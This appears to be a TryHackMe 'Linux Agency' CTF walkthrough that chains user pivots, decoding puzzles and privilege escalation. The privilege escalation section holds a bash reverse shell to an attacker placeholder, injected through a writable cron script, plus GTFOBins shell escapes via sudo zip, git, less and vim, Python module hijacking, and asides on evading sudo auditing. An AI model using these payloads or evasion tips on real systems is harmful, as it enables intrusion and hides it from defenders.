# Try Hack Me — Linux Agency CTF Walkthrough

---

## Author

**PulseEinher**

---

## Introduction

**Hello, stranger — let's begin.**

![Ready to go??](./images/linuxagency_1.webp)

---

## Challenge Link

Today's problem is: https://tryhackme.com/room/linuxagency

---

## Challenge Overview

| Field | Details |
|---|---|
| **Machine** | Linux Agency (THM) |
| **Path** | SSH Access → User Pivoting → Enumeration → Cron Exploit → Reverse Shell → Sudo/GTFOBins Abuse → Docker Escape → CVE-2019–14287 → Root |
| **Key Takeaway** | Chained misconfigurations — including weak user isolation, exposed cron jobs, unsafe sudo privileges, and Docker socket access — enabled step-by-step privilege escalation from a low-privileged user to full root on both container and host systems. |
| **Business Impact** | In a real-world HITMAN-style operational environment (simulating segmented agents or roles), such weak isolation and misconfigured privilege controls would allow an attacker to pivot across internal identities, abuse automation mechanisms like cron, and ultimately escape container boundaries to compromise the underlying host — resulting in full operational takeover, exposure of sensitive mission data, and loss of control over critical infrastructure. |

---

## Initial Access

The following entry was added to the `/etc/hosts` file to simplify hostname-based interaction with the target system:

```
<TARGET_IP> linux.thm
```

As the SSH credentials were already provided, the machine was accessed using the following login credentials, and the **Mission 1** flag was present in the initial login verbose.

```bash
┌──(root㉿vbox)-[~]
└─# ssh agent47@linux.thm
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
agent47@linux.thm's password:
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

<<MISSION1_FLAG>>
agent47@linuxagency:~$ whoami
agent47
```

> **Note:** A direct method to get root is also listed at the end of the writeup, but if doing for learning purposes, follow the process step by step as given below.

---

## Mission Flags

### Mission 2 — Switch to `mission1`

The user was switched to the `mission1` user and the **Mission 2** flag was captured from `/home/mission1`.

```bash
agent47@linuxagency:~$ su mission1
Password:
mission1@linuxagency:/home/agent47$ whoami
mission1
mission1@linuxagency:/home/agent47$ cd /home/mission1
mission1@linuxagency:~$ ls
<<MISSION2_FLAG>>
```

---

### Mission 3 — Switch to `mission2`

The **Mission 3** flag was captured from the `/home/mission2` directory.

```bash
mission1@linuxagency:~$ su mission2
Password:
mission2@linuxagency:/home/mission1$ cd /home/mission2
mission2@linuxagency:~$ cat flag.txt
<<MISSION3_FLAG>>
```

---

### Mission 4 — Switch to `mission3`

The **Mission 4** flag was captured from the `/home/mission3` directory.

```bash
mission2@linuxagency:~$ su mission3
Password:
mission3@linuxagency:/home/mission2$ cd /home/mission3
mission3@linuxagency:~$ cat flag.txt -A
<<MISSION4_FLAG>>^MI am really sorry man the flag is stolen by some thief's.
```

> The `-A` flag prints all the characters, because the first line is getting overwritten by the second line, hence it cannot be captured without the flag.

---

### Mission 5 — Switch to `mission4`

The **Mission 5** flag was captured from the `/home/mission4/flag` directory.

```bash
mission3@linuxagency:~$ su mission4
Password:
mission4@linuxagency:/home/mission3$ cd /home/mission4
mission4@linuxagency:~$ cd flag/
mission4@linuxagency:~/flag$ cat flag.txt
<<MISSION5_FLAG>>
```

---

### Mission 6 — Switch to `mission5`

The **Mission 6** flag was captured from the `/home/mission5` directory. The flag file was hidden (prefixed with `.`).

```bash
mission4@linuxagency:~/flag$ su mission5
Password:
mission5@linuxagency:/home/mission4/flag$ cd /home/mission5
mission5@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission5 mission5 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission5 mission5    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission5 mission5 3771 Jan 12  2021 .bashrc
-r--------  1 mission5 mission5   43 Jan 12  2021 .flag.txt
-rw-r--r--  1 mission5 mission5  807 Jan 12  2021 .profile
mission5@linuxagency:~$ cat .flag.txt
<<MISSION6_FLAG>>
```

---

### Mission 7 — Switch to `mission6`

The **Mission 7** flag was captured from the `/home/mission6/.flag` directory. The flag was stored inside a hidden subdirectory.

```bash
mission5@linuxagency:~$ su mission6
Password:
mission6@linuxagency:/home/mission5$ cd /home/mission6
mission6@linuxagency:~$ ls -la
total 20
drwxr-x---  3 mission6 mission6 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission6 mission6    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission6 mission6 3771 Jan 12  2021 .bashrc
drwxr-xr-x  2 mission6 mission6 4096 Jan 12  2021 .flag
-rw-r--r--  1 mission6 mission6  807 Jan 12  2021 .profile
mission6@linuxagency:~$ cd .flag/
mission6@linuxagency:~/.flag$ cat flag.txt
<<MISSION7_FLAG>>
```

---

### Mission 8 — Switch to `mission7`

The **Mission 8** flag was captured from the `/home/mission7` directory.

```bash
mission6@linuxagency:~/.flag$ su mission7
Password:
bash: /home/mission6/.bashrc: Permission denied
mission7@linuxagency:~/.flag$ cd /home/mission7
mission7@linuxagency:/home/mission7$ cat flag.txt
<<MISSION8_FLAG>>
```

---

### Mission 9 — Switch to `mission8`

The **Mission 9** flag was not located in the expected directory and was instead identified using the `find` utility.

```bash
mission7@linuxagency:/home/mission7$ su mission8
Password:
mission8@linuxagency:/home/mission7$ cd /home/mission8
mission8@linuxagency:~$ find / -type f -name "flag.txt" 2>/dev/null
/flag.txt
mission8@linuxagency:~$ cat /flag.txt
<<MISSION9_FLAG>>
```

---

### Mission 10 — Switch to `mission9`

The **Mission 10** flag was captured from the `/home/mission9` directory by grepping the `rockyou.txt` wordlist.

```bash
mission8@linuxagency:~$ su mission9
Password:
mission9@linuxagency:/home/mission8$ cd /home/mission9
mission9@linuxagency:~$ ls
rockyou.txt
mission9@linuxagency:~$ cat rockyou.txt | grep "mission10"
mission101
mission10
<<MISSION10_FLAG>>
mission1098
mission108
```

---

### Mission 11 — Switch to `mission10`

The **Mission 11** flag was captured from the `/home/mission10/folder/L4D8/L3D7/L2D2/L1D10` directory using `find`.

```bash
mission9@linuxagency:~$ su mission10
Password:
mission10@linuxagency:/home/mission9$ cd /home/mission10
mission10@linuxagency:~$ find . -type f -name "flag.txt"
./folder/L4D8/L3D7/L2D2/L1D10/flag.txt
mission10@linuxagency:~$ cat folder/L4D8/L3D7/L2D2/L1D10/flag.txt
<<MISSION11_FLAG>>
```

---

### Mission 12 — Switch to `mission11`

The **Mission 12** flag was stored in a `flag` variable in the `.bashrc` file as a reverse Base64 encoded string.

```bash
mission10@linuxagency:~$ su mission11
Password:
mission11@linuxagency:/home/mission10$ cd /home/mission11
mission11@linuxagency:~$ cat .bashrc | grep "flag"
export flag=$(echo fTAyN2E5Zjc2OTUzNjQ1MzcyM2NkZTZkMzNkMWE5NDRmezIxbm9pc3NpbQo= |base64 -d|rev)
mission11@linuxagency:~$ echo $flag
<<MISSION12_FLAG>>
```

---

### Mission 13 — Switch to `mission12`

The flag file was owned by user `mission12` but had no permissions assigned. The flag was retrieved after manually adding read permission.

```bash
mission11@linuxagency:~$ su mission12
Password:
mission12@linuxagency:/home/mission11$ cd /home/mission12
mission12@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission12 mission12 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission12 mission12    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission12 mission12 3771 Jan 12  2021 .bashrc
----------  1 mission12 mission12   44 Jan 12  2021 flag.txt
-rw-r--r--  1 mission12 mission12  807 Jan 12  2021 .profile
mission12@linuxagency:~$ chmod +r flag.txt
mission12@linuxagency:~$ cat flag.txt
<<MISSION13_FLAG>>
```

---

### Mission 14 — Switch to `mission13`

The flag content was Base64 encoded. It was decoded to reveal the **Mission 14** flag.

```bash
mission12@linuxagency:~$ su mission13
Password:
mission13@linuxagency:/home/mission12$ cd /home/mission13
mission13@linuxagency:~$ ls
flag.txt
mission13@linuxagency:~$ cat flag.txt
bWlzc2lvbjE0e2Q1OThkZTk1NjM5NTE0Yjk5NDE1MDc2MTdiOWU1NGQyfQo=
mission13@linuxagency:~$ echo "bWlzc2lvbjE0e2Q1OThkZTk1NjM5NTE0Yjk5NDE1MDc2MTdiOWU1NGQyfQo=" | base64 -d
<<MISSION14_FLAG>>
```

> **Note:** All further decoding and decryption performed using an online tool was done via the following resource:
> [dCode — Cipher Identifier](https://www.dcode.fr/cipher-identifier)

---

### Mission 15 — Switch to `mission14`

The flag content was a binary (ASCII) string. When decoded using the online tool, it revealed the **Mission 15** flag.

```bash
mission13@linuxagency:~$ su mission14
Password:
mission14@linuxagency:/home/mission13$ cd /home/mission14
mission14@linuxagency:~$ cat flag.txt
01101101011010010111001101110011011010010110111101101110001100010011010101111011011001100110001100110100001110010011000100110101011001000011100000110001001110000110001001100110011000010110010101100110011001100011000000110001001100010011100000110101011000110011001100110101001101000011011101100110001100100011010100110101001110010011011001111101
```

---

### Mission 16 — Switch to `mission15`

The flag content was a hexadecimal string. When decoded using the online tool, it revealed the **Mission 16** flag.

```bash
mission14@linuxagency:~$ su mission15
Password:
mission15@linuxagency:/home/mission14$ cd /home/mission15
mission15@linuxagency:~$ cat flag.txt
6D697373696F6E31367B38383434313764343030333363346332303931623434643763323661393038657D
```

---

### Mission 17 — Switch to `mission16`

The flag was stored as an executable binary. Execute permissions were granted and the binary was run to reveal the **Mission 17** flag.

```bash
mission15@linuxagency:~$ su mission16
Password:
mission16@linuxagency:/home/mission15$ cd /home/mission16
mission16@linuxagency:~$ ls
flag
mission16@linuxagency:~$ chmod +x flag
mission16@linuxagency:~$ ./flag
<<MISSION17_FLAG>>
```

> **Note:** All further source code was executed using the following online compiler:
> [OneCompiler — Free Online Compiler](https://onecompiler.com)

---

### Mission 18 — Switch to `mission17`

The **Mission 18** flag was embedded in Java source code using XOR encryption with key `13`. When executed using the online compiler, it revealed the flag.

```bash
mission16@linuxagency:~$ su mission17
Password:
mission17@linuxagency:/home/mission16$ cd /home/mission17
mission17@linuxagency:~$ cat flag.java
```

```java
import java.util.*;
public class flag
{
    public static void main(String[] args)
    {
        String outputString="";
        String encrypted_flag="`d~~dbc<5vk=4:;=;9445;o954nil>?=lo8k:4<:h5p";
        int length = encrypted_flag.length();
        for (int i = 0 ; i < length ; i++)
        {
            outputString = outputString + Character.toString((char) (encrypted_flag.charAt(i) ^ 13));
        }
        System.out.println(outputString);
    }
}
```

> The Java code, when executed using the online compiler, revealed the **Mission 18** flag.

---

### Mission 19 — Switch to `mission18`

The **Mission 19** flag was embedded in Ruby source code using XOR encryption. When executed using the online compiler, it revealed the flag.

```bash
mission17@linuxagency:~$ su mission18
Password:
mission18@linuxagency:/home/mission17$ cd /home/mission18
mission18@linuxagency:~$ ls
flag.rb
mission18@linuxagency:~$ cat flag.rb
```

```ruby
def encryptDecrypt(string)
    key = ['K', 'C', 'Q']
    result = ""
    codepoints = string.each_codepoint.to_a
    codepoints.each_index do |i|
        result += (codepoints[i] ^ 'Z'.ord).chr
    end
    result
end

encrypted = encryptDecrypt("73))354kc!;j8<nk<ol8i;9lhh>bjb<m;nibohon8m'")
puts "#{encrypted}"
```

> The Ruby code, when executed using the online compiler, revealed the **Mission 19** flag.

---

### Mission 20 — Switch to `mission19`

The **Mission 20** flag was embedded in C source code using XOR encryption. When executed using the online compiler, it revealed the flag.

```bash
mission18@linuxagency:~$ su mission19
Password:
mission19@linuxagency:/home/mission18$ cd /home/mission19
mission19@linuxagency:~$ ls
flag.c
mission19@linuxagency:~$ cat flag.c
```

```c
#include<stdio.h>
int main()
{
    char flag[] = "gcyyced8:qh:>28l3o3:i2kn8>8;hl>9?9in2oko;iw";
    int length = strlen(flag);
    for (int i = 0 ; i < length ; i++)
    {
        flag[i] = flag[i] ^ 10;
        printf("%c",flag[i]);
    }
    printf("\n\n");
    return 0;
}
```

> The C code, when executed using the online compiler, revealed the **Mission 20** flag.

---

### Mission 21 — Switch to `mission20`

The **Mission 21** flag was embedded in Python source code using XOR encryption. When executed using the online compiler, it revealed the flag.

```bash
mission19@linuxagency:~$ su mission20
Password:
mission20@linuxagency:/home/mission19$ cd /home/mission20
mission20@linuxagency:~$ ls
flag.py
mission20@linuxagency:~$ cat flag.py
```

```python
flag = ">:  :<=ab(d76dfe2210fak1gge5e61`kgbj`bk5c0."
for i in range(len(flag)):
    flag = (flag[:i] + chr(ord(flag[i]) ^ ord("S")) +flag[i + 1:]);
    print(flag[i], end = "");
print()
```

> The Python code, when executed using the online compiler, revealed the **Mission 21** flag.

---

### Mission 22 — Switch to `mission21`

After the user was switched, a primitive shell was spawned. When the shell was upgraded using the Python `pty` utility, the **Mission 22** flag was revealed.

```bash
mission20@linuxagency:~$ su mission21
Password:
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<<MISSION22_FLAG>>
```

---

### Mission 23 — Switch to `mission22`

After the user was switched, a restricted Python shell was spawned. It was escaped by importing a Bash shell via the `pty` module. The **Mission 23** flag was captured from `/home/mission22`.

```bash
mission21@linuxagency:~$ su mission22
Password:
Python 3.6.9 (default, Oct  8 2020, 12:12:24)
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pty;
>>> pty.spawn("/bin/bash")
mission22@linuxagency:/home/mission20$ cd /home/mission22
mission22@linuxagency:~$ cat flag.txt
<<MISSION23_FLAG>>
```

---

### Mission 24 — Switch to `mission23`

The **Mission 24** flag was captured from a locally running web service on port 80.

```bash
mission22@linuxagency:~$ su mission23
Password:
mission23@linuxagency:/home/mission22$ cd /home/mission23
mission23@linuxagency:~$ ls
message.txt
mission23@linuxagency:~$ cat message.txt
The hosts will help you.
[OPTIONAL] Maybe you will need curly hairs.
mission23@linuxagency:~$ ss -tuln
Netid State   Recv-Q  Send-Q         Local Address:Port      Peer Address:Port
udp   UNCONN  19968   0              127.0.0.53%lo:53             0.0.0.0:*
udp   UNCONN  0       0         10.49.145.207%ens5:68             0.0.0.0:*
udp   UNCONN  0       0                    0.0.0.0:631            0.0.0.0:*
udp   UNCONN  5376    0                    0.0.0.0:5353           0.0.0.0:*
udp   UNCONN  0       0                    0.0.0.0:44012          0.0.0.0:*
udp   UNCONN  0       0                       [::]:47490             [::]:*
udp   UNCONN  47104   0                       [::]:5353              [::]:*
tcp   LISTEN  0       128                127.0.0.1:2222           0.0.0.0:*
tcp   LISTEN  0       128                127.0.0.1:80             0.0.0.0:*
tcp   LISTEN  0       128            127.0.0.53%lo:53             0.0.0.0:*
tcp   LISTEN  0       128                  0.0.0.0:22             0.0.0.0:*
tcp   LISTEN  0       5                  127.0.0.1:631            0.0.0.0:*
tcp   LISTEN  0       128                127.0.0.1:33019          0.0.0.0:*
tcp   LISTEN  0       128                     [::]:22                [::]:*
tcp   LISTEN  0       5                      [::1]:631               [::]:*
mission23@linuxagency:~$ curl 127.0.0.1:80 | grep "mission24"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10924  100 10924    0     0  5333k      0 --:--:-- --:--:-- --:--:-- 5333k
    <title><<MISSION24_FLAG>></title>
```

---

### Mission 25 — Switch to `mission24`

The `strings` utility revealed an environment variable `pocket` whose value was required to be set to `money` in order to receive the flag.

```bash
mission23@linuxagency:~$ su mission24
Password:
mission24@linuxagency:/home/mission23$ cd /home/mission24
mission24@linuxagency:~$ strings bribe
.
.
.
pocket
money
Here ya go!!!
Don't tell police about the deal man ;)
init
There is a guy who is smuggling flags
Bribe this guy to get the flag
Put some money in his pocket to get the flag
export init=abc
Money
MONEY
Words are not the price for your flag
Give Me money Man!!!
.
.
.
mission24@linuxagency:~$ export pocket=money
mission24@linuxagency:~$ ./bribe
Here ya go!!!
<<MISSION25_FLAG>>
Don't tell police about the deal man ;)
```

---

### Mission 26 — Switch to `mission25`

The `PATH` variable was empty, causing standard commands to fail. It was manually restored to the default value to capture the **Mission 26** flag.

```bash
mission24@linuxagency:~$ su mission25
Password:
mission25@linuxagency:/home/mission24$ cd /home/mission25
mission25@linuxagency:~$ ls
bash: ls: No such file or directory
mission25@linuxagency:~$ echo $PATH

mission25@linuxagency:~$ export PATH=/bin:/usr/bin:/usr/local/bin
mission25@linuxagency:~$ cat flag.txt
<<MISSION26_FLAG>>
```

---

### Mission 27 — Switch to `mission26`

The **Mission 27** flag was embedded inside a JPEG image file and extracted using `strings`.

```bash
mission25@linuxagency:~$ su mission26
Password:
mission26@linuxagency:/home/mission25$ cd /home/mission26
mission26@linuxagency:~$ ls
flag.jpg
mission26@linuxagency:~$ strings flag.jpg | grep "mission27"
<<MISSION27_FLAG>>
```

---

### Mission 28 — Switch to `mission27`

The flag file had a long multi-extension name. The `file` command identified it as gzip-compressed data. It was renamed for easier manipulation and decompressed using `gunzip`. The resulting file was identified as a GIF image, and `strings` was used to extract the **Mission 28** flag.

```bash
mission26@linuxagency:~$ su mission27
Password:
mission27@linuxagency:/home/mission26$ cd /home/mission27
mission27@linuxagency:~$ ls
flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
mission27@linuxagency:~$ file flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz: gzip compressed data, was "flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png", last modified: Mon Jan 11 06:42:10 2021, from Unix
mission27@linuxagency:~$ cp flag.* flag.gz
mission27@linuxagency:~$ gunzip flag.gz
mission27@linuxagency:~$ ls
flag  flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
mission27@linuxagency:~$ file flag
flag: GIF image data, version 87a, 27914 x 29545
mission27@linuxagency:~$ strings flag | grep "mission28"
<<MISSION28_FLAG>>
```

---

### Mission 29 — Switch to `mission28`

After the user was switched, a restricted IRB (Interactive Ruby) shell was spawned. It was escaped by executing a Bash shell via `exec`. The **Mission 29** flag was stored in a reversed filename (`txt.galf`) and the content was also reversed.

```bash
mission27@linuxagency:~$ su mission28
Password:
irb(main):001:0> exec "/bin/bash"
mission28@linuxagency:/home/mission27$ cd /home/mission28
mission28@linuxagency:~$ cat txt.galf
}1fff2ad47eb52e68523621b8d50b2918{92noissim
mission28@linuxagency:~$ echo "}1fff2ad47eb52e68523621b8d50b2918{92noissim" | rev
<<MISSION29_FLAG>>
```

---

### Mission 30 — Switch to `mission29`

The **Mission 30** flag was captured from the `.htpasswd` file inside the `/home/mission29/bludit` directory.

```bash
mission28@linuxagency:~$ su mission29
Password:
mission29@linuxagency:/home/mission28$ cd /home/mission29/bludit
mission29@linuxagency:~/bludit$ ls -la
total 44
drwxr-xr-x  7 mission29 mission29 4096 Jan 12  2021 .
drwxr-x---  3 mission29 mission29 4096 Jan 12  2021 ..
drwxr-xr-x  2 mission29 mission29 4096 Jan 12  2021 bl-content
drwxr-xr-x 10 mission29 mission29 4096 Jan 12  2021 bl-kernel
drwxr-xr-x  2 mission29 mission29 4096 Jan 12  2021 bl-languages
drwxr-xr-x 27 mission29 mission29 4096 Jan 12  2021 bl-plugins
drwxr-xr-x  4 mission29 mission29 4096 Jan 12  2021 bl-themes
-rw-r--r--  1 mission29 mission29  394 Jan 12  2021 .htaccess
-rw-r--r--  1 mission29 mission29   44 Jan 12  2021 .htpasswd
-rw-r--r--  1 mission29 mission29  900 Jan 12  2021 index.php
-rw-r--r--  1 mission29 mission29 1083 Jan 12  2021 LICENSE
mission29@linuxagency:~/bludit$ cat .htpasswd | grep "mission30"
<<MISSION30_FLAG>>
```

---

## Privilege Escalation

### Victor Flag — Git Log Enumeration (`mission30`)

The **Victor** flag was captured from the `/home/mission30/Escalator` directory via `git log`.

```bash
mission30@linuxagency:~/Escalator$ ls -la
total 16
drwxr-xr-x 3 mission30 mission30 4096 Jan 12  2021 .
drwxr-x--- 3 mission30 mission30 4096 Apr 12 06:39 ..
drwxr-xr-x 8 mission30 mission30 4096 Jan 12  2021 .git
-rw-r--r-- 1 mission30 mission30   35 Jan 12  2021 sources.py
mission30@linuxagency:~/Escalator$ git log
commit 24cbf44a9cb0e65883b3f76ef5533a2b2ef96497 (HEAD -> master, origin/master)
Author: root <root@Xyan1d3>
Date:   Mon Jan 11 15:37:56 2021 +0530

    My 1st python Script

commit e0b807dbeb5aba190d6307f072abb60b34425d44
Author: root <root@Xyan1d3>
Date:   Mon Jan 11 15:36:40 2021 +0530

    Your flag is <<VICTOR_FLAG>>
```

---

### Dalia Flag — Cron Job Exploitation (`viktor` → `dalia`)

Cron jobs were analyzed, revealing that a script (`/opt/scripts/47.sh`) was periodically overwritten and temporarily assigned writable ownership to `viktor`.

```bash
viktor@linuxagency:/opt/scripts$ cat /etc/crontab
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   dalia   sleep 30;/opt/scripts/47.sh
*  *    * * *   root    echo "IyEvYmluL2Jhc2gKI2VjaG8gIkhlbGxvIDQ3IgpybSAtcmYgL2Rldi9zaG0vCiNlY2hvICJIZXJlIHRpbWUgaXMgYSBncmVhdCBtYXR0ZXIgb2YgZXNzZW5jZSIKcm0gLXJmIC90bXAvCg==" | base64 -d > /opt/scripts/47.sh;chown viktor:viktor /opt/scripts/47.sh;chmod +x /opt/scripts/47.sh;
```

A reverse shell payload was injected within the execution window to gain access as user `dalia`.

The following payload was used:

```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
```

The content of `/opt/scripts/47.sh` was replaced with the reverse shell payload:

```bash
viktor@linuxagency:/opt/scripts$ echo "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1" >> 47.sh
```

The reverse shell was stabilised using the following commands:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo
fg
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 columns 120
```

A Netcat listener was started and the reverse shell was triggered via the cron job:

```bash
┌──(root㉿vbox)-[~]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.149.224] from (UNKNOWN) [10.49.159.164] 52842
bash: cannot set terminal process group (6713): Inappropriate ioctl for device
bash: no job control in this shell
dalia@linuxagency:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
dalia@linuxagency:~$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(root㉿vbox)-[~]
└─# stty raw -echo
fg
[1]  + continued  nc -lvnp 4444

dalia@linuxagency:~$ whoami
dalia
```

The **Dalia** flag was captured from `/home/dalia`:

```bash
dalia@linuxagency:~$ whoami
dalia
dalia@linuxagency:~$ cd /home/dalia/
dalia@linuxagency:~$ cat flag.txt
<<DALIA_FLAG>>
```

> **Note:** Race-condition based cron exploitation is highly timing-dependent and unreliable in real environments. To bypass this limitation, attackers typically automate the overwrite process using continuous loops or filesystem event monitoring (e.g., `inotify`) to ensure payload injection occurs within the writable window.

---

### Silvio Flag — GTFOBins: `zip` (`dalia` → `silvio`)

The `sudo -l` command revealed that the user could execute `/usr/bin/zip` as `silvio` without a password.

```bash
dalia@linuxagency:~$ sudo -l
Matching Defaults entries for dalia on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dalia may run the following commands on linuxagency:
    (silvio) NOPASSWD: /usr/bin/zip
```

The following command was used to spawn a shell as `silvio`:

```bash
sudo -u silvio /usr/bin/zip test.zip /etc/hosts -T -TT 'sh #'
```

| Flag | Description |
|---|---|
| `-T` | Test archive integrity |
| `-TT` | Specify a custom test command |
| `'sh #'` | Spawns a shell; `#` comments out any trailing arguments |

```bash
dalia@linuxagency:/tmp$ sudo -u silvio /usr/bin/zip test.zip /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 37%)
$ whoami
silvio
```

The **Silvio** flag was captured from `/home/silvio`:

```bash
$ whoami
silvio
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
silvio@linuxagency:/tmp$ cd /home/silvio/
silvio@linuxagency:~$ cat flag.txt
<<SILVIO_FLAG>>
```

---

### Reza Flag — GTFOBins: `git` (`silvio` → `reza`)

The `sudo -l` output revealed the ability to execute `git` as `reza`. The pager escape technique was used to spawn a shell.

```bash
silvio@linuxagency:~$ sudo -l
Matching Defaults entries for silvio on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User silvio may run the following commands on linuxagency:
    (reza) SETENV: NOPASSWD: /usr/bin/git
```

The following command was used to spawn a shell as `reza`:

```bash
sudo -u reza git -p help config
```

Then, inside the pager, enter:

```
!/bin/bash
```

| Flag | Description |
|---|---|
| `-p` | Force pager (usually `less`) |
| `help config` | Opens the help/manual page, ensuring output is piped to the pager |
| `!/bin/bash` | Spawns a terminal shell from within the pager |

```bash
silvio@linuxagency:/tmp$ sudo -u reza git -p help config
GIT-CONFIG(1)                     Git Manual                     GIT-CONFIG(1)
...
!/bin/bash
reza@linuxagency:/tmp$ whoami
reza
```

The **Reza** flag was captured from `/home/reza`:

```bash
reza@linuxagency:/tmp$ whoami
reza
reza@linuxagency:/tmp$ cd /home/reza/
reza@linuxagency:~$ cat flag.txt
<<REZA_FLAG>>
```

---

### Jordan Flag — Python Module Hijacking (`reza` → `jordan`)

Further enumeration revealed the ability to execute a Python script as `jordan` with controllable environment variables. Module hijacking was performed to gain a shell as `jordan`.

```bash
reza@linuxagency:~$ sudo -l
Matching Defaults entries for reza on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User reza may run the following commands on linuxagency:
    (jordan) SETENV: NOPASSWD: /opt/scripts/Gun-Shop.py
```

A Python file spawning a shell was created in `/tmp` and loaded as a module via a controlled `PYTHONPATH`:

```bash
reza@linuxagency:/tmp$ echo 'import os; os.system("/bin/bash")' > /tmp/random.py
reza@linuxagency:/tmp$ sudo -u jordan PYTHONPATH=/tmp /opt/scripts/Gun-Shop.py
jordan@linuxagency:/tmp$ whoami
jordan
```

The **Jordan** flag was captured from `/home/jordan`. The flag content was stored in reverse:

```bash
jordan@linuxagency:/tmp$ whoami
jordan
jordan@linuxagency:/tmp$ cd /home/jordan/
jordan@linuxagency:~$ cat flag.txt | rev
<<JORDAN_FLAG>>
```

---

### Ken Flag — GTFOBins: `less` (`jordan` → `ken`)

The `less` binary was abused to escalate privileges to `ken`:

```bash
sudo -u ken /usr/bin/less /etc/passwd
```

Then, inside the pager, enter:

```
!/bin/bash
```

| Argument | Description |
|---|---|
| `/etc/passwd` | Any arbitrary readable file to open with `less` |
| `!/bin/bash` | Spawns a terminal shell from within the pager |

```bash
jordan@linuxagency:~$ sudo -u ken /usr/bin/less /etc/passwd
ken@linuxagency:/home/jordan$ whoami
ken
```

The **Ken** flag was captured from `/home/ken`:

```bash
ken@linuxagency:/home/jordan$ whoami
ken
ken@linuxagency:/home/jordan$ cd /home/ken/
ken@linuxagency:~$ cat flag.txt
<<KEN_FLAG>>
```

---

### Sean Flag — GTFOBins: `vim` (`ken` → `sean`)

The `vim` binary was abused to escalate privileges to `sean`:

```bash
sudo -u sean /usr/bin/vim /etc/passwd
```

Then, inside `vim`, enter:

```
:!/bin/bash
```

| Argument | Description |
|---|---|
| `/etc/passwd` | Any arbitrary readable file to open with `vim` |
| `:!/bin/bash` | Executes a shell command from within `vim` |

The user flag was not present in the designated home directory. Further enumeration revealed that the **Sean** flag was present in `/var/log/syslog.bak`:

```bash
sean@linuxagency:/var/log$ cat syslog.bak | grep "sean"
Jan 12 02:58:58 ubuntu kernel: [    0.000000] ACPI: LAPIC_NMI (acpi_id[0x6d] high edge lint[0x1]) : <<SEAN_FLAG>> <REDACTED>
```

> **Note:** Execution of known GTFOBins through `sudo` is often logged and monitored in production environments. In real-world scenarios, alternative binaries or indirect execution techniques are used to reduce visibility and avoid command auditing.

---

### Penelope Flag — Base64 Credentials in Logs (`sean` → `penelope`)

A Base64 encoded string was also identified within the logs, which when decoded revealed credentials for the user `penelope`.

```bash
sean@linuxagency:/var/log$ echo "<REDACTED>" | base64 -d
The password of penelope is <REDACTED>
sean@linuxagency:/var/log$ su penelope
Password:
penelope@linuxagency:/var/log$ whoami
penelope
```

The **Penelope** flag was captured from `/home/penelope`:

```bash
penelope@linuxagency:/var/log$ whoami
penelope
penelope@linuxagency:/var/log$ cd /home/penelope/
penelope@linuxagency:~$ cat flag.txt
<<PENELOPE_FLAG>>
```

---

### Maya Flag — SUID `base64` Abuse (`penelope` → `maya`)

Enumeration of the directory revealed a SUID-enabled `base64` binary owned by `maya`. This binary was abused to read files with Maya's privileges.

```bash
penelope@linuxagency:~$ ls -la
total 80
